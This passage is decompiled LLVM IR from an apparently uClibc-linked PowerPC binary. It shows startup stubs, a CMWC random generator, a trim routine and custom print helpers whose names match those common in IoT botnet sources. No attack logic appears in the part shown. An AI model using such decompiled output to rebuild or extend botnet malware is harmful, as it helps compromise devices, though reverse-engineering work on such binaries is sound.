  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_10028244.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_10028244.3 to i32*), align 4
  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_10028854.1, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_10028854.1, { 1, 0 }
  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %v3_100001a0 = load i32, i32* @global_var_1002823c.7, align 4
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %entry
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %entry
  ret i32 ptrtoint (i32* @global_var_1002823c.7 to i32)
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  %v7_10000234 = call i32 @__uClibc_main(i32 268482728, i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 268520716, i32 %arg1)
  ret i32 %v7_10000234

; uselistorder directives
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_10028870.8, align 4
  %v1_10000260 = add i32 %arg1, -1640531527
  store i32 %v1_10000260, i32* @global_var_10028874.9, align 4
  %v1_10000278 = add i32 %arg1, 1013904242
  store i32 %v1_10000278, i32* @global_var_10028878.10, align 4
  br label %dec_label_pc_10000294

dec_label_pc_10000294:                            ; preds = %entry, %dec_label_pc_10000294
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_100002fc, %dec_label_pc_10000294 ]
  %v1_1000029c = mul i32 %storemerge12, 4
  %v2_100002ac = add i32 %v1_1000029c, add (i32 ptrtoint (i32* @global_var_10028870.8 to i32), i32 -12)
  %v1_100002b0 = inttoptr i32 %v2_100002ac to i32*
  %v2_100002b0 = load i32, i32* %v1_100002b0, align 4
  %v2_100002c8 = add i32 %v1_1000029c, add (i32 ptrtoint (i32* @global_var_10028870.8 to i32), i32 -8)
  %v1_100002cc = inttoptr i32 %v2_100002c8 to i32*
  %v2_100002cc = load i32, i32* %v1_100002cc, align 4
  %v2_100002d0 = xor i32 %storemerge12, -1640531527
  %v2_100002d8 = xor i32 %v2_100002d0, %v2_100002b0
  %v1_100002e0 = xor i32 %v2_100002d8, %v2_100002cc
  %v2_100002f0 = add i32 %v1_1000029c, ptrtoint (i32* @global_var_10028870.8 to i32)
  %v2_100002f4 = inttoptr i32 %v2_100002f0 to i32*
  store i32 %v1_100002e0, i32* %v2_100002f4, align 4
  %v1_100002fc = add nuw nsw i32 %storemerge12, 1
  %tmp7 = icmp slt i32 %v1_100002fc, 4096
  br i1 %tmp7, label %dec_label_pc_10000294, label %dec_label_pc_10000310

dec_label_pc_10000310:                            ; preds = %dec_label_pc_10000294
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000029c, { 2, 1, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10000294, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  store i32 18782, i32* %r10.global-to-local, align 4
  %v3_10000348 = load i32, i32* @global_var_1002845c.11, align 4
  %v1_1000034c = add i32 %v3_10000348, 1
  %v1_10000350 = urem i32 %v1_1000034c, 4096
  store i32 %v1_10000350, i32* @global_var_1002845c.11, align 4
  %v1_1000036c = mul nuw nsw i32 %v1_10000350, 4
  %v2_10000370 = add i32 %v1_1000036c, ptrtoint (i32* @global_var_10028870.8 to i32)
  %v1_10000374 = inttoptr i32 %v2_10000370 to i32*
  %v2_10000374 = load i32, i32* %v1_10000374, align 4
  %v6_10000398 = udiv i32 %v2_10000374, 228675
  %v2_1000039c = mul i32 %v2_10000374, 18782
  %v3_100003ac = load i32, i32* @global_var_10028458.12, align 4
  %v2_100003b8 = add i32 %v3_100003ac, %v2_1000039c
  %v3_100003b8 = icmp ult i32 %v2_100003b8, %v3_100003ac
  %v4_100003bc = zext i1 %v3_100003b8 to i32
  %v5_100003bc = add nuw nsw i32 %v4_100003bc, %v6_10000398
  store i32 %v5_100003bc, i32* %r10.global-to-local, align 4
  %v2_100003ec = add i32 %v5_100003bc, %v2_100003b8
  %v2_10000400 = icmp ult i32 %v2_100003ec, %v5_100003bc
  br i1 %v2_10000400, label %dec_label_pc_10000408, label %dec_label_pc_10000428

dec_label_pc_10000408:                            ; preds = %entry
  %v1_1000040c = add i32 %v2_100003ec, 1
  %v1_1000041c = add nuw nsw i32 %v5_100003bc, 1
  br label %dec_label_pc_10000428

dec_label_pc_10000428:                            ; preds = %entry, %dec_label_pc_10000408
  %storemerge = phi i32 [ %v1_1000041c, %dec_label_pc_10000408 ], [ %v5_100003bc, %entry ]
  %stack_var_-36.0 = phi i32 [ %v1_1000040c, %dec_label_pc_10000408 ], [ %v2_100003ec, %entry ]
  store i32 %storemerge, i32* @global_var_10028458.12, align 4
  store i32 %v1_10000350, i32* %r10.global-to-local, align 4
  %v2_10000438 = sub i32 -2, %stack_var_-36.0
  store i32 %v2_10000438, i32* %v1_10000374, align 4
  %v0_10000458 = load i32, i32* %r10.global-to-local, align 4
  %v1_10000458 = mul i32 %v0_10000458, 4
  %v2_1000045c = add i32 %v1_10000458, ptrtoint (i32* @global_var_10028870.8 to i32)
  %v1_10000460 = inttoptr i32 %v2_1000045c to i32*
  %v2_10000460 = load i32, i32* %v1_10000460, align 4
  ret i32 %v2_10000460

; uselistorder directives
  uselistorder i32 %v5_100003bc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v3_100003ac, { 1, 0 }
  uselistorder i32 %v2_10000374, { 1, 0 }
  uselistorder i32 %v1_10000350, { 2, 0, 1 }
  uselistorder i32* @global_var_10028870.8, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10028870.8 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_10000428, { 1, 0 }
}

define i32 @trim(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000049c = call i32 @__GI_strlen()
  store i32 %v0_1000049c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100004c0

dec_label_pc_100004b4:                            ; preds = %dec_label_pc_100004c0
  %v1_100004b8 = add i32 %stack_var_-36.0, 1
  br label %dec_label_pc_100004c0

dec_label_pc_100004c0:                            ; preds = %entry, %dec_label_pc_100004b4
  %stack_var_-36.0 = phi i32 [ 0, %entry ], [ %v1_100004b8, %dec_label_pc_100004b4 ]
  %v2_100004cc = add i32 %stack_var_-36.0, %arg1
  %v3_100004cc = inttoptr i32 %v2_100004cc to i8*
  %v3_100004d0 = load i8, i8* %v3_100004cc, align 1
  %v4_100004d0 = zext i8 %v3_100004d0 to i32
  store i32 %v4_100004d0, i32* %r3.global-to-local, align 4
  %v3_100004e0 = call i32 @isspace(i32 %v4_100004d0, i32 %v2_100004cc)
  store i32 %v3_100004e0, i32* %r3.global-to-local, align 4
  %v3_100004e8 = icmp eq i32 %v3_100004e0, 0
  br i1 %v3_100004e8, label %dec_label_pc_10000500.preheader, label %dec_label_pc_100004b4

dec_label_pc_10000500.preheader:                  ; preds = %dec_label_pc_100004c0
  %v1_100004a8 = add i32 %v0_1000049c, -1
  %v2_100005087 = icmp slt i32 %v1_100004a8, %stack_var_-36.0
  br i1 %v2_100005087, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_10000510

dec_label_pc_100004f4:                            ; preds = %dec_label_pc_10000510
  %v1_100004f8 = add i32 %stack_var_-40.010, -1
  %v2_10000508 = icmp slt i32 %v1_100004f8, %stack_var_-36.0
  br i1 %v2_10000508, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_10000510

dec_label_pc_10000510:                            ; preds = %dec_label_pc_10000500.preheader, %dec_label_pc_100004f4
  %stack_var_-40.010 = phi i32 [ %v1_100004f8, %dec_label_pc_100004f4 ], [ %v1_100004a8, %dec_label_pc_10000500.preheader ]
  %v2_1000051c = add i32 %stack_var_-40.010, %arg1
  %v3_1000051c = inttoptr i32 %v2_1000051c to i8*
  %v3_10000520 = load i8, i8* %v3_1000051c, align 1
  %v4_10000520 = zext i8 %v3_10000520 to i32
  store i32 %v4_10000520, i32* %r3.global-to-local, align 4
  %v3_10000530 = call i32 @isspace(i32 %v4_10000520, i32 %v2_1000051c)
  store i32 %v3_10000530, i32* %r3.global-to-local, align 4
  %v3_10000538 = icmp eq i32 %v3_10000530, 0
  br i1 %v3_10000538, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_100004f4

dec_label_pc_1000058c.preheader:                  ; preds = %dec_label_pc_100004f4, %dec_label_pc_10000510, %dec_label_pc_10000500.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %v1_100004a8, %dec_label_pc_10000500.preheader ], [ %v1_100004f8, %dec_label_pc_100004f4 ], [ %stack_var_-40.010, %dec_label_pc_10000510 ]
  %v3_100005943 = icmp sgt i32 %stack_var_-36.0, %stack_var_-40.0.lcssa
  br i1 %v3_100005943, label %dec_label_pc_1000059c, label %dec_label_pc_1000054c

dec_label_pc_1000054c:                            ; preds = %dec_label_pc_1000058c.preheader, %dec_label_pc_1000054c
  %v2_100005b06 = phi i32 [ %v2_100005b0, %dec_label_pc_1000054c ], [ %arg1, %dec_label_pc_1000058c.preheader ]
  %storemerge15 = phi i32 [ %v1_10000584, %dec_label_pc_1000054c ], [ %stack_var_-36.0, %dec_label_pc_1000058c.preheader ]
  %v2_10000570 = add i32 %storemerge15, %arg1
  %v1_10000574 = inttoptr i32 %v2_10000570 to i8*
  %v2_10000574 = load i8, i8* %v1_10000574, align 1
  %v3_1000057c = inttoptr i32 %v2_100005b06 to i8*
  store i8 %v2_10000574, i8* %v3_1000057c, align 1
  %v1_10000584 = add i32 %storemerge15, 1
  %v3_10000594 = icmp sgt i32 %v1_10000584, %stack_var_-40.0.lcssa
  %v2_100005a4 = sub i32 %v1_10000584, %stack_var_-36.0
  %v2_100005b0 = add i32 %v2_100005a4, %arg1
  br i1 %v3_10000594, label %dec_label_pc_1000059c, label %dec_label_pc_1000054c

dec_label_pc_1000059c:                            ; preds = %dec_label_pc_1000054c, %dec_label_pc_1000058c.preheader
  %v2_100005b0.lcssa = phi i32 [ %arg1, %dec_label_pc_1000058c.preheader ], [ %v2_100005b0, %dec_label_pc_1000054c ]
  %v3_100005b8 = inttoptr i32 %v2_100005b0.lcssa to i8*
  store i8 0, i8* %v3_100005b8, align 1
  %v0_100005d0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100005d0

; uselistorder directives
  uselistorder i32 %v1_10000584, { 2, 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_100004a8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-36.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 6, 1, 4, 5, 0 }
  uselistorder i32 %arg1, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder label %dec_label_pc_1000054c, { 1, 0 }
  uselistorder label %dec_label_pc_1000058c.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000510, { 1, 0 }
  uselistorder label %dec_label_pc_100004c0, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_100005e8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-20, align 4
  %v3_100005f4 = icmp eq i32 %v0_100005e8, 0
  br i1 %v3_100005f4, label %dec_label_pc_10000628, label %dec_label_pc_100005fc

dec_label_pc_100005fc:                            ; preds = %entry
  %v1_10000600 = inttoptr i32 %v0_100005e8 to i32*
  %v2_10000600 = load i32, i32* %v1_10000600, align 4
  %v1_1000060c = trunc i32 %arg2 to i8
  %v3_1000060c = inttoptr i32 %v2_10000600 to i8*
  store i8 %v1_1000060c, i8* %v3_1000060c, align 1
  %v2_10000614 = load i32, i32* %v1_10000600, align 4
  %v1_10000618 = add i32 %v2_10000614, 1
  store i32 %v1_10000618, i32* %v1_10000600, align 4
  %v0_10000650.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000063c

dec_label_pc_10000628:                            ; preds = %entry
  %v2_10000628 = ptrtoint i32* %stack_var_-20 to i32
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268437052, i32* @lr, align 4
  %v2_10000638 = call i32 @__libc_write(i32 1, i32 %v2_10000628)
  store i32 %v2_10000638, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000063c

dec_label_pc_1000063c:                            ; preds = %dec_label_pc_100005fc, %dec_label_pc_10000628
  %v0_10000650 = phi i32 [ %v0_10000650.pre, %dec_label_pc_100005fc ], [ %v2_10000638, %dec_label_pc_10000628 ]
  ret i32 %v0_10000650

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000063c, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp46 = icmp slt i32 %arg3, 1
  br i1 %tmp46, label %dec_label_pc_10000718, label %dec_label_pc_10000694

dec_label_pc_10000694:                            ; preds = %entry
  %v2_100006c427 = load i8, i8* %arg2, align 1
  %v3_100006cc30 = icmp eq i8 %v2_100006c427, 0
  br i1 %v3_100006cc30, label %dec_label_pc_100006d4, label %dec_label_pc_100006a8

dec_label_pc_100006a8:                            ; preds = %dec_label_pc_10000694, %dec_label_pc_100006a8
  %v4_100006c032 = phi i32 [ %v1_100006b8, %dec_label_pc_100006a8 ], [ %tmp, %dec_label_pc_10000694 ]
  %stack_var_-20.031 = phi i32 [ %v1_100006ac, %dec_label_pc_100006a8 ], [ 0, %dec_label_pc_10000694 ]
  %v1_100006ac = add i32 %stack_var_-20.031, 1
  %v1_100006b8 = add i32 %v4_100006c032, 1
  %v5_100006bc = inttoptr i32 %v1_100006b8 to i8*
  %v2_100006c4 = load i8, i8* %v5_100006bc, align 1
  %v3_100006cc = icmp eq i8 %v2_100006c4, 0
  br i1 %v3_100006cc, label %dec_label_pc_100006d4, label %dec_label_pc_100006a8

dec_label_pc_100006d4:                            ; preds = %dec_label_pc_100006a8, %dec_label_pc_10000694
  %stack_var_-20.0.lcssa = phi i32 [ 0, %dec_label_pc_10000694 ], [ %v1_100006ac, %dec_label_pc_100006a8 ]
  %v2_100006dc = icmp slt i32 %stack_var_-20.0.lcssa, %arg3
  br i1 %v2_100006dc, label %dec_label_pc_100006f0, label %dec_label_pc_10000700

dec_label_pc_100006f0:                            ; preds = %dec_label_pc_100006d4
  %v2_100006f8 = sub i32 %arg3, %stack_var_-20.0.lcssa
  br label %dec_label_pc_10000700

dec_label_pc_10000700:                            ; preds = %dec_label_pc_100006d4, %dec_label_pc_100006f0
  %storemerge4 = phi i32 [ %v2_100006f8, %dec_label_pc_100006f0 ], [ 0, %dec_label_pc_100006d4 ]
  %v1_10000704 = call i32 @__asm_rlwinm(i32 %arg4, i32 0, i32 30, i32 30)
  %v3_10000708 = icmp eq i32 %v1_10000704, 0
  br i1 %v3_10000708, label %dec_label_pc_10000718, label %dec_label_pc_10000710

dec_label_pc_10000710:                            ; preds = %dec_label_pc_10000700
  br label %dec_label_pc_10000718

dec_label_pc_10000718:                            ; preds = %dec_label_pc_10000700, %entry, %dec_label_pc_10000710
  %stack_var_-32.0 = phi i32 [ %arg3, %entry ], [ %storemerge4, %dec_label_pc_10000700 ], [ %storemerge4, %dec_label_pc_10000710 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_10000700 ], [ 48, %dec_label_pc_10000710 ]
  %v1_1000071c = urem i32 %arg4, 2
  %v3_10000720 = icmp eq i32 %v1_1000071c, 0
  br i1 %v3_10000720, label %dec_label_pc_10000750.preheader, label %dec_label_pc_10000790.preheader

dec_label_pc_10000750.preheader:                  ; preds = %dec_label_pc_10000718
  %v2_1000075420 = icmp sgt i32 %stack_var_-32.0, 0
  br i1 %v2_1000075420, label %dec_label_pc_1000072c.lr.ph, label %dec_label_pc_10000790.preheader

dec_label_pc_1000072c.lr.ph:                      ; preds = %dec_label_pc_10000750.preheader
  %v2_10000734 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_1000072c

dec_label_pc_1000072c:                            ; preds = %dec_label_pc_1000072c.lr.ph, %dec_label_pc_1000072c
  %stack_var_-32.123 = phi i32 [ %stack_var_-32.0, %dec_label_pc_1000072c.lr.ph ], [ %v1_10000748, %dec_label_pc_1000072c ]
  %v3_10000734 = call i32 @printchar(i32* %v2_10000734, i32 %stack_var_-16.0)
  %v1_10000748 = add nsw i32 %stack_var_-32.123, -1
  %v2_10000754 = icmp sgt i32 %stack_var_-32.123, 1
  br i1 %v2_10000754, label %dec_label_pc_1000072c, label %dec_label_pc_10000790.preheader

dec_label_pc_10000790.preheader:                  ; preds = %dec_label_pc_1000072c, %dec_label_pc_10000750.preheader, %dec_label_pc_10000718
  %stack_var_-12.1.ph = phi i32 [ 0, %dec_label_pc_10000718 ], [ 0, %dec_label_pc_10000750.preheader ], [ %stack_var_-32.0, %dec_label_pc_1000072c ]
  %stack_var_-32.2.ph = phi i32 [ %stack_var_-32.0, %dec_label_pc_10000718 ], [ %stack_var_-32.0, %dec_label_pc_10000750.preheader ], [ 0, %dec_label_pc_1000072c ]
  %v2_1000079411 = load i8, i8* %arg2, align 1
  %v3_1000079c14 = icmp eq i8 %v2_1000079411, 0
  br i1 %v3_1000079c14, label %dec_label_pc_100007cc.preheader, label %dec_label_pc_10000760.lr.ph

dec_label_pc_10000760.lr.ph:                      ; preds = %dec_label_pc_10000790.preheader
  %v2_10000774 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_10000760

dec_label_pc_10000760:                            ; preds = %dec_label_pc_10000760.lr.ph, %dec_label_pc_10000760
  %v4_1000079017 = phi i32 [ %tmp, %dec_label_pc_10000760.lr.ph ], [ %v1_10000788, %dec_label_pc_10000760 ]
  %stack_var_-36.016 = phi i8* [ %arg2, %dec_label_pc_10000760.lr.ph ], [ %v5_1000078c, %dec_label_pc_10000760 ]
  %stack_var_-12.115 = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10000760.lr.ph ], [ %v1_1000077c, %dec_label_pc_10000760 ]
  %v2_10000764 = load i8, i8* %stack_var_-36.016, align 1
  %v3_10000764 = zext i8 %v2_10000764 to i32
  %v3_10000774 = call i32 @printchar(i32* %v2_10000774, i32 %v3_10000764)
  %v1_1000077c = add i32 %stack_var_-12.115, 1
  %v1_10000788 = add i32 %v4_1000079017, 1
  %v5_1000078c = inttoptr i32 %v1_10000788 to i8*
  %v2_10000794 = load i8, i8* %v5_1000078c, align 1
  %v3_1000079c = icmp eq i8 %v2_10000794, 0
  br i1 %v3_1000079c, label %dec_label_pc_100007cc.preheader, label %dec_label_pc_10000760

dec_label_pc_100007cc.preheader:                  ; preds = %dec_label_pc_10000760, %dec_label_pc_10000790.preheader
  %stack_var_-12.1.lcssa = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10000790.preheader ], [ %v1_1000077c, %dec_label_pc_10000760 ]
  %v2_100007d06 = icmp sgt i32 %stack_var_-32.2.ph, 0
  br i1 %v2_100007d06, label %dec_label_pc_100007a8.lr.ph, label %dec_label_pc_100007d8

dec_label_pc_100007a8.lr.ph:                      ; preds = %dec_label_pc_100007cc.preheader
  %v2_100007b0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_100007a8

dec_label_pc_100007a8:                            ; preds = %dec_label_pc_100007a8.lr.ph, %dec_label_pc_100007a8
  %stack_var_-32.39 = phi i32 [ %stack_var_-32.2.ph, %dec_label_pc_100007a8.lr.ph ], [ %v1_100007c4, %dec_label_pc_100007a8 ]
  %v3_100007b0 = call i32 @printchar(i32* %v2_100007b0, i32 %stack_var_-16.0)
  %v1_100007c4 = add nsw i32 %stack_var_-32.39, -1
  %v2_100007d0 = icmp sgt i32 %stack_var_-32.39, 1
  br i1 %v2_100007d0, label %dec_label_pc_100007a8, label %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge

dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge: ; preds = %dec_label_pc_100007a8
  %tmp47 = add i32 %stack_var_-12.1.lcssa, %stack_var_-32.2.ph
  br label %dec_label_pc_100007d8

dec_label_pc_100007d8:                            ; preds = %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge, %dec_label_pc_100007cc.preheader
  %stack_var_-12.2.lcssa = phi i32 [ %tmp47, %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge ], [ %stack_var_-12.1.lcssa, %dec_label_pc_100007cc.preheader ]
  ret i32 %stack_var_-12.2.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-12.1.lcssa, { 1, 0 }
  uselistorder i32 %v1_10000788, { 1, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %stack_var_-20.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_100006b8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100007a8, { 1, 0 }
  uselistorder label %dec_label_pc_10000760, { 1, 0 }
  uselistorder label %dec_label_pc_1000072c, { 1, 0 }
  uselistorder label %dec_label_pc_10000718, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000700, { 1, 0 }
  uselistorder label %dec_label_pc_100006a8, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %v3_10000844 = icmp eq i32 %arg2, 0
  br i1 %v3_10000844, label %dec_label_pc_1000084c, label %dec_label_pc_10000880

dec_label_pc_1000084c:                            ; preds = %entry
  store i32 48, i32* %stack_var_-88, align 4
  %v4_10000870 = bitcast i32* %stack_var_-88 to i8*
  %v5_10000870 = call i32 @prints(i32 %arg1, i8* %v4_10000870, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_100009d8

dec_label_pc_10000880:                            ; preds = %entry
  %v3_10000884 = icmp eq i32 %arg4, 0
  br i1 %v3_10000884, label %dec_label_pc_100008b8, label %dec_label_pc_1000088c

dec_label_pc_1000088c:                            ; preds = %dec_label_pc_10000880
  %v3_10000890 = icmp eq i32 %arg3, 10
  br i1 %v3_10000890, label %dec_label_pc_10000898, label %dec_label_pc_100008b8

dec_label_pc_10000898:                            ; preds = %dec_label_pc_1000088c
  %tmp27 = icmp sgt i32 %arg2, -1
  br i1 %tmp27, label %dec_label_pc_100008b8, label %dec_label_pc_100008a4

dec_label_pc_100008a4:                            ; preds = %dec_label_pc_10000898
  %v1_100008b0 = sub i32 0, %arg2
  br label %dec_label_pc_100008b8

dec_label_pc_100008b8:                            ; preds = %dec_label_pc_1000088c, %dec_label_pc_10000898, %dec_label_pc_10000880, %dec_label_pc_100008a4
  %stack_var_-44.0 = phi i32 [ %arg2, %dec_label_pc_10000880 ], [ %arg2, %dec_label_pc_10000898 ], [ %v1_100008b0, %dec_label_pc_100008a4 ], [ %arg2, %dec_label_pc_1000088c ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_10000880 ], [ 0, %dec_label_pc_10000898 ], [ 1, %dec_label_pc_100008a4 ], [ 0, %dec_label_pc_1000088c ]
  %tmp28 = bitcast i32* %stack_var_-77 to i8*
  store i8 0, i8* %tmp28, align 4
  %v3_100009445 = icmp eq i32 %stack_var_-44.0, 0
  br i1 %v3_100009445, label %dec_label_pc_1000094c, label %dec_label_pc_100008d0.lr.ph

dec_label_pc_100008d0.lr.ph:                      ; preds = %dec_label_pc_100008b8
  %v2_10000900 = add i32 %arg7, -58
  br label %dec_label_pc_100008d0

dec_label_pc_100008d0:                            ; preds = %dec_label_pc_100008d0.lr.ph, %dec_label_pc_1000090c
  %stack_var_-44.17 = phi i32 [ %stack_var_-44.0, %dec_label_pc_100008d0.lr.ph ], [ %v2_10000938, %dec_label_pc_1000090c ]
  %stack_var_-28.06 = phi i8* [ %tmp28, %dec_label_pc_100008d0.lr.ph ], [ %v5_10000914, %dec_label_pc_1000090c ]
  %v2_100008d8 = urem i32 %stack_var_-44.17, %arg3
  %tmp29 = icmp slt i32 %v2_100008d8, 10
  br i1 %tmp29, label %dec_label_pc_1000090c, label %dec_label_pc_100008f8

dec_label_pc_100008f8:                            ; preds = %dec_label_pc_100008d0
  %v1_10000904 = add i32 %v2_10000900, %v2_100008d8
  br label %dec_label_pc_1000090c

dec_label_pc_1000090c:                            ; preds = %dec_label_pc_100008d0, %dec_label_pc_100008f8
  %stack_var_-32.0 = phi i32 [ %v2_100008d8, %dec_label_pc_100008d0 ], [ %v1_10000904, %dec_label_pc_100008f8 ]
  %v4_1000090c = ptrtoint i8* %stack_var_-28.06 to i32
  %v1_10000910 = add i32 %v4_1000090c, -1
  %v5_10000914 = inttoptr i32 %v1_10000910 to i8*
  %fold = add i32 %stack_var_-32.0, 48
  %v1_1000092c = trunc i32 %fold to i8
  store i8 %v1_1000092c, i8* %v5_10000914, align 1
  %v2_10000938 = udiv i32 %stack_var_-44.17, %arg3
  %v3_10000944 = icmp ult i32 %stack_var_-44.17, %arg3
  br i1 %v3_10000944, label %dec_label_pc_1000094c, label %dec_label_pc_100008d0

dec_label_pc_1000094c:                            ; preds = %dec_label_pc_1000090c, %dec_label_pc_100008b8
  %stack_var_-28.0.lcssa = phi i8* [ %tmp28, %dec_label_pc_100008b8 ], [ %v5_10000914, %dec_label_pc_1000090c ]
  %v3_10000950 = icmp eq i32 %stack_var_-36.0, 0
  br i1 %v3_10000950, label %dec_label_pc_100009b4, label %dec_label_pc_10000958

dec_label_pc_10000958:                            ; preds = %dec_label_pc_1000094c
  %v3_1000095c = icmp eq i32 %arg5, 0
  br i1 %v3_1000095c, label %dec_label_pc_1000099c, label %dec_label_pc_10000964

dec_label_pc_10000964:                            ; preds = %dec_label_pc_10000958
  %v1_10000968 = call i32 @__asm_rlwinm(i32 %arg6, i32 0, i32 30, i32 30)
  %v3_1000096c = icmp eq i32 %v1_10000968, 0
  br i1 %v3_1000096c, label %dec_label_pc_1000099c, label %dec_label_pc_10000974

dec_label_pc_10000974:                            ; preds = %dec_label_pc_10000964
  %v2_1000097c = inttoptr i32 %arg1 to i32*
  %v3_1000097c = call i32 @printchar(i32* %v2_1000097c, i32 45)
  %v1_10000990 = add i32 %arg5, -1
  br label %dec_label_pc_100009b4

dec_label_pc_1000099c:                            ; preds = %dec_label_pc_10000964, %dec_label_pc_10000958
  %v4_1000099c = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v1_100009a0 = add i32 %v4_1000099c, -1
  %v5_100009a4 = inttoptr i32 %v1_100009a0 to i8*
